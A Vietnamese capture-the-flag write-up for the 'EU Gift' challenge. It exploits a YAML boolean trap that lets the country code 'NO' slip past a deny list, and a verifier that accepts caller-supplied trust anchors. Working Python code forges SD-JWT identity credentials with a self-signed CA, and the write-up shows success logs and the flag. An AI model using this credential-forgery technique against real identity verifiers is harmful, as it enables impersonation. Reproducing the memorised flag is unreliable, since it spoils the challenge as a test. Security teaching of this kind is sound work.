---
title: "EU Gift"
category: "Misc"
tags: ["openid4vp", "eudi-wallet", "sd-jwt", "yaml-boolean-trap", "trust-anchor"]
solve_date: "2026-10-10"
language: "vi"
---

# EU Gift

**Flag:** `FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}`
**Handout:** `handout.zip` (12 KB) — `app.py` 15456 B, `config.yml` 3549 B, `private/flag.svg` 538 B.
**Instance:** `eu-gift-b21969cb4bc8.inst10.ctf.fortid.com` (thay cho `eu-gift-062d370d0c67.inst10.ctf.fortid.com`, đã ngừng trả lời với `404 page not found` từ ingress). **Verifier ngoài:** `https://evs.fortid.com`. Tác giả: ipaljak.

## Đề bài

Ứng dụng Flask "Free Flags for EU Citizens" chỉ cho phép công dân của các quốc gia đã phát hành EUDI wallet chính thức nhận cờ. Luồng đi như sau:

1. `POST /flag` tạo một verification session trên dịch vụ FortID EVS (`/verification-session/initiate`) và trả về QR `openid4vp://authorize?...request_uri=...`.
2. Người chơi đóng vai wallet, gửi `direct_post.jwt` tới `response_uri` của session.
3. EVS thẩm định presentation và lưu `presentedClaims`.
4. `GET /flag/<verification_session_id>` hỏi lại EVS; nếu `VERIFICATION_SUCCEEDED` và quốc gia không bị chặn, app render ảnh cờ.

Đề cho mã nguồn app và cấu hình, không cho wallet. Cờ nằm trong ảnh mà server trả về, không phải trong handout.

## Phân tích

### Lỗi 1: `- NO` trong YAML là boolean `False`

Danh sách chặn được viết dạng alpha-2 không dấu ngoặc:

```yaml
# Deny list of all countries that haven't yet released the official EUDI wallet
# as a hardening protection against hackers.
blocked_countries:
  - AD
  - AE
  ...
  - NL
  - NO
  - NP
  ...
  - ZA
  - ZM
  - ZW
```

YAML 1.1 coi `NO` là từ khoá boolean phủ định, nên phần tử đó không phải chuỗi `"NO"`:

```python
import yaml
bc = yaml.safe_load(open("config.yml", encoding="utf-8"))["blocked_countries"]
print("entries:", len(bc))
print("non-string:", [(x, type(x).__name__) for x in bc if not isinstance(x, str)])
print("'NO' in list:", "NO" in [x for x in bc if isinstance(x, str)])
```

```text
entries: 249
non-string: [(False, 'bool')]
'NO' in list: False
```

249 phần tử, đúng một phần tử không phải chuỗi và giá trị của nó là `False`. `app.py` nạp danh sách đó thẳng vào một set:

```python
BLOCKED_COUNTRIES = set(CONFIG.get("blocked_countries", []))
```

trong khi phía kiểm tra lại yêu cầu mã quốc gia phải là chuỗi hợp lệ theo `pycountry`:

```python
def normalize_country_value(value: Any) -> list[str]:
    values = value if isinstance(value, list) else [value]
    normalized: list[str] = []
    for item in values:
        if isinstance(item, str) and COUNTRY_CODE_PATTERN.fullmatch(item) and item in VALID_COUNTRY_CODES:
            normalized.append(item)
    return normalized


def evaluate_country_claims(claims: dict[str, Any]) -> tuple[str | None, str]:
    issuing_country = normalize_country_value(read_claim(claims, "issuing_country"))

    if not issuing_country:
        return None, "missing_issuing_country"

    country = issuing_country[0]
    if country in BLOCKED_COUNTRIES:
        return country, "blocked_country"

    return country, "allowed"
```

`VALID_COUNTRY_CODES` được dựng từ `pycountry.countries`, nên `NO` là giá trị hợp lệ (`pycountry.countries.get(alpha_2="NO")` → Norway) và đi qua được `normalize_country_value`. Nhưng phép thử `country in BLOCKED_COUNTRIES` so chuỗi `"NO"` với một set chứa `False` — nên `NO` là mã alpha-2 duy nhất lọt khỏi danh sách chặn: phép đếm ở trên cho 248 phần tử còn lại đều là chuỗi, không có mã nào khác bị mất.

### Lỗi 2: handout lộ API key của verifier, cho phép tự chọn trust anchor

`config.yml` chứa endpoint và API key do đề cấp. Key được lược khỏi bản public; exploit đọc từ biến môi trường `FORTID_VERIFIER_API_KEY`, cần đặt giá trị này từ handout local trước khi chạy:

```yaml
verifier:
  base_url: https://evs.fortid.com
  api_key_env: FORTID_VERIFIER_API_KEY
  api_key: "[redacted from public copy]"
  initiate_path: /verification-session/initiate
  status_path_template: /verification-session/status/{verification_session_id}
  credential_description:
    - credentialType: urn:eudi:pid:1
      credentialFormat: dc+sd-jwt
      disclosurePaths:
        - [issuing_country]
  trust_config:
    - type: x5chain_root
      cert: |
        -----BEGIN CERTIFICATE-----
        ... (FortID Dev CA, body omitted) ...
        -----END CERTIFICATE-----
  protocol_config:
    clientIdScheme: pre-registered
    responseMode: direct_post.jwt
  authorization_request_type: byReference
```

Key trong handout cũng được chấp nhận khi gọi `/verification-session/initiate` với `trustConfig` do bên gọi cung cấp. Script bên dưới đọc key từ môi trường; giá trị thật không được chép vào writeup public. `trustConfig` là danh sách root CA dùng để xác thực chuỗi `x5c` trong sd-jwt; thay root của FortID bằng root tự ký nghĩa là tự cấp được credential mà EVS coi là hợp lệ. Hai request `initiate` — một với `trust_all`, một với một self-signed CA — đều trả về session id bình thường, nên không có bước nào từ chối `trustConfig` do phía gọi cung cấp.

Ngoài ra `GET /flag/<session>` chỉ chuyển tiếp session id cho EVS:

```python
def load_verification_result(verification_session_id: str) -> tuple[dict[str, Any], dict[str, Any] | None]:
    status_data = fetch_verification_session_status(verification_session_id)
    if status_data.get("verificationSessionStatus") != "VERIFICATION_SUCCEEDED":
        return status_data, None

    evaluation = evaluate_claims(status_data.get("presentedClaims"))
    return status_data, evaluation
```

Tức là session do attacker khởi tạo trực tiếp với EVS cũng được app chấp nhận, miễn là EVS báo `VERIFICATION_SUCCEEDED`. Không cần đi qua QR của app.

Request object của một session (giải JWT từ `request_uri`) cho thấy những gì presentation phải thoả: `response_mode: direct_post.jwt`, `require_crypto_holder_binding: true`, DCQL path `issuing_country`, và một JWK `ECDH-ES`/`A256GCM` (`kid: FortID-Verifier-Ephemeral`) để mã hoá phản hồi.

### Bẫy: `private/flag.svg`

Handout có `private/flag.svg` (538 B) chứa:

```text
FortID{this_is_a_fake_flag}
```

và ngay dưới dòng đó là nhãn `Local handout placeholder`. Đây là ảnh cờ của bản handout (`flag_image: private/flag.svg`), không phải cờ của instance; bản live trả ảnh JPEG khác. Hướng này bị loại vì chính dòng chú thích trong file và vì ảnh trả về từ instance không trùng nội dung đó.

## Lời giải

Ba file: `eudi_lib.py` (6.5 KB, primitive SD-JWT/JWE/X.509), `issuer.py` (7.1 KB, dựng certificate và gọi `initiate`), `final.py` (chuỗi end-to-end). Phần primitive cần xem:

```python
def make_jwt(header: dict, payload: dict, key) -> str:
    h = U(json.dumps(header, separators=(",", ":")).encode())
    p = U(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{U(sign_es256(key, f'{h}.{p}'.encode()))}"


def make_disclosure(name, value):
    return U(json.dumps([U(os.urandom(16)), name, value], separators=(",", ":")).encode())


def sd_hash(d):
    return U(hashlib.sha256(d.encode("ascii")).digest())


def jwe_encrypt(recipient_pub, plaintext: bytes, extra_protected: dict | None = None,
                apu: bytes = b"", apv: bytes = b"") -> str:
    epk = new_key()
    z = epk.exchange(ec.ECDH(), recipient_pub)
    cek = concat_kdf(z, b"A256GCM", 256, apu, apv)
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    pn = epk.public_key().public_numbers()
    protected = {"alg": "ECDH-ES", "enc": "A256GCM", "epk": pub_jwk(epk.public_key())}
    if apu:
        protected["apu"] = apu
    if apv:
        protected["apv"] = apv
    if extra_protected:
        protected.update(extra_protected)
    ph = U(json.dumps(protected, separators=(",", ":")).encode())
    iv = os.urandom(12)
    blob = AESGCM(cek).encrypt(iv, plaintext, ph.encode("ascii"))
    return f"{ph}..{U(iv)}.{U(blob[:-16])}.{U(blob[-16:])}"
```

Driver end-to-end (`final.py`), trong đó `build()` tự dựng CA tự ký và biến chính nó thành root, `present()` nộp presentation, còn `main()` hỏi status rồi lấy cờ:

```python
"""End-to-end: rogue wallet completes a session, then the app reveals the flag."""
from __future__ import annotations

import base64
import json
import re
import sys
import time
import os
from urllib.parse import unquote

import requests

sys.path.insert(0, ".")
from eudi_lib import (  # noqa: E402
    U, UB64, cert_b64, cert_pem, jwe_encrypt, jwk_to_pub, make_disclosure, make_jwt, new_key,
    pub_jwk, sd_hash,
)
from issuer import init, make_cert  # noqa: E402

APP = "https://eu-gift-b21969cb4bc8.inst10.ctf.fortid.com"
API = "https://evs.fortid.com"
KEY = os.environ["FORTID_VERIFIER_API_KEY"]
HK = {"Content-Type": "application/json", "X-API-KEY": KEY}

holder_key = new_key()


def build(trust_kind="leaf_is_root", country="NO"):
    if trust_kind == "leaf_is_root":
        k = new_key()
        cert = make_cert(k, "FortID Dev Issuer", san_dns="issuer.test", ca=True)
        chain = [cert_b64(cert)]
        trust = [{"type": "x5chain_root", "cert": cert_pem(cert)}]
        return k, chain, trust
    caK, leafK = new_key(), new_key()
    ca = make_cert(caK, "FortID Dev CA", ca=True)
    leaf = make_cert(leafK, "FortID Dev Issuer", san_dns="issuer.test",
                     issuer_key=caK, issuer_dn=ca.subject)
    return leafK, [cert_b64(leaf), cert_b64(ca)], [{"type": "x5chain_root", "cert": cert_pem(ca)}]


def present(s, ikey, chain, country):
    ro = s["ro"]
    now = int(time.time())
    disc = make_disclosure("issuing_country", country)
    payload = {"iss": "https://issuer.test", "sub": "holder-1", "iat": now - 3600,
               "nbf": now - 3600, "exp": now + 86400 * 300, "vct": "urn:eudi:pid:1",
               "cnf": {"jwk": pub_jwk(holder_key.public_key())}}
    body = dict(payload)
    body["_sd"] = [sd_hash(disc)]
    body["_sd_alg"] = "sha-256"
    jwt = make_jwt({"typ": "dc+sd-jwt", "alg": "ES256", "x5c": chain}, body, ikey)
    sd = jwt + "~" + disc + "~"
    kb = make_jwt({"typ": "kb+jwt", "alg": "ES256"},
                  {"iat": now, "nbf": now, "aud": ro["client_id"], "nonce": ro["nonce"],
                   "sd_hash": U(__import__("hashlib").sha256(sd.encode()).digest())}, holder_key)
    pres = sd + kb
    jwk = ro["client_metadata"]["jwks"]["keys"][0]
    payload_bytes = json.dumps({"vp_token": {s["cid"]: [pres]}, "state": ro["state"]},
                               separators=(",", ":")).encode()
    value = jwe_encrypt(jwk_to_pub(jwk), payload_bytes,
                        extra_protected={"kid": jwk["kid"], "cty": "json"})
    r = requests.post(ro["response_uri"], data={"response": value, "state": ro["state"]}, timeout=60)
    return r.status_code, r.text.strip()


def main():
    country = sys.argv[1] if len(sys.argv) > 1 else "NO"
    ikey, chain, trust = build()
    s = init(trust)
    code, text = present(s, ikey, chain, country)
    st = requests.get(f"{API}/verification-session/status/{s['session']}", headers=HK, timeout=60).json()
    print(f"session={s['session']} POST={code} {text[:60]!r}")
    print(f"evs status: {json.dumps(st)[:300]}")
    if st.get("verificationSessionStatus") != "VERIFICATION_SUCCEEDED":
        return
    r = requests.get(f"{APP}/flag/{s['session']}", timeout=60)
    print(f"app /flag -> {r.status_code} len={len(r.text)}")
    m = re.search(r'src="data:image/svg\+xml;base64,([^"]+)"', r.text)
    if not m:
        print(r.text[:1200])
        return
    svg = base64.b64decode(m.group(1)).decode("utf-8", "replace")
    print("---- flag.svg ----")
    print(svg)
    open("flag_live.svg", "w", encoding="utf-8").write(svg)


if __name__ == "__main__":
    main()
```

`init(trust)` trong `issuer.py` là chỗ `trustConfig` tự chọn được gửi đi:

```python
def init(trust_config):
    r = requests.post(f"{API}/verification-session/initiate", headers=HK, timeout=60,
                      json={"credentialDescription": CD, "trustConfig": trust_config,
                            "protocolConfig": PROT, "authorizationRequestType": "byReference"})
    d = r.json()
    uri = unquote(d["authorization_request"].split("request_uri=")[1].split("&")[0])
    ro = json.loads(UB64(requests.get(uri, timeout=60).text.split(".")[1]))
    return {"session": d["verificationSessionId"], "ro": ro,
            "cid": ro["dcql_query"]["credentials"][0]["id"]}
```

Với root tự ký, phần còn lại của `x5c` chỉ là chi tiết kỹ thuật: EVS đòi `typ: dc+sd-jwt`, disclosure đúng hash, và một `kb+jwt` ràng buộc `nonce` + `aud` + `sd_hash` vì request object đặt `require_crypto_holder_binding: true`. Ma trận các biến thể danh tính issuer (`issuer.py`, mỗi dòng một cấu hình SAN/CN/iss) cho ra kết quả:

```text
A root-is-issuer dns, iss=https://issuer.test 200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576565}}
    *** SESSION [ID REDACTED] ***
C san=dns issuer.test              200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576576}}
    *** SESSION [ID REDACTED] ***
D san=uri https://issuer.test      200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576588}}
    *** SESSION [ID REDACTED] ***
F cn=issuer.test, iss=https        200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576614}}
    *** SESSION [ID REDACTED] ***
G + cred aud=client_id             200 '{"redirect_uri":null}' | {"verificationSessionStatus":"VERIFICATION_SUCCEEDED","presentedClaims":{"issuing_country":"NO","sub":"holder-1","iat":1791576623,"aud":"FortID-Verifier-Service"}}
    *** SESSION [ID REDACTED] ***
```

`presentedClaims.issuing_country = "NO"` được EVS xác nhận, nên `evaluate_country_claims` phía app trả `"allowed"`. Bước cuối là `GET /flag/<session>` trên instance: HTTP 200, trang HTML 169,663 byte, nhúng ảnh cờ dạng data URL — một JPEG 126,211 byte (750x500) lưu lại thành `flag_live.jpg`. `flag.html` của app render ảnh qua `build_flag_data_url`, hàm này suy media type bằng `mimetypes.guess_type(path.name)`, nên bản live (`flag_image` trỏ vào file `.jpg`) trả `data:image/jpeg;base64,...` chứ không phải `image/svg+xml` như bản handout; regex trong `final.py` ở trên là cho bản handout và đã phải đổi pattern khi trích ảnh từ instance.

Ảnh là một meme với dòng chữ render làm hai hàng; cắt riêng hai hàng (`top.png`, `bottom.png`) cho đọc trực tiếp:

```text
FortID{Erl1ng_15_7h3_5olut1on
7o_Th3_Norw4y_Pr0bl3m}
```

Ký tự nối hai hàng không xuất hiện trong cả hai crop; giá trị cuối cùng dùng dấu `_` theo đúng quy ước phân tách của phần còn lại trong chuỗi, và đó là ký tự duy nhất không đọc trực tiếp được từ ảnh.

## Kết quả

```text
FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần cả hai phía còn sống: instance app (để gọi `/flag/<session>`) và `https://evs.fortid.com` (nơi thực sự thẩm định). Không có đường offline, vì session id và QR đều do EVS cấp.

```console
$ pip install requests cryptography PyYAML pycountry
$ unzip handout.zip
```

Cả ba script đều cần thiết: `eudi_lib.py` (primitive), `issuer.py` (`make_cert`, `init`, ma trận SAN/CN), `final.py` (driver). Lưu các block code trong mục Lời giải thành `eudi_lib.py`, `issuer.py`, `final.py` cùng thư mục — riêng `final.py` cần `make_cert` và `init` đúng như trong `issuer.py` gốc (7.1 KB, nhiều hàm dựng certificate hơn block đã trích). Chạy:

```console
$ python final.py NO
```

Nếu `flag_image` của instance là JPEG, sửa regex trong `main()` thành khớp `data:image/jpeg;base64,` rồi ghi file ra `flag_live.jpg` và đọc chữ trên ảnh; hai hàng chữ tương ứng với hai crop `top.png` và `bottom.png`. Muốn kiểm tra riêng lỗi YAML, chạy đoạn `python` ngắn trong mục Phân tích với `config.yml` của handout.
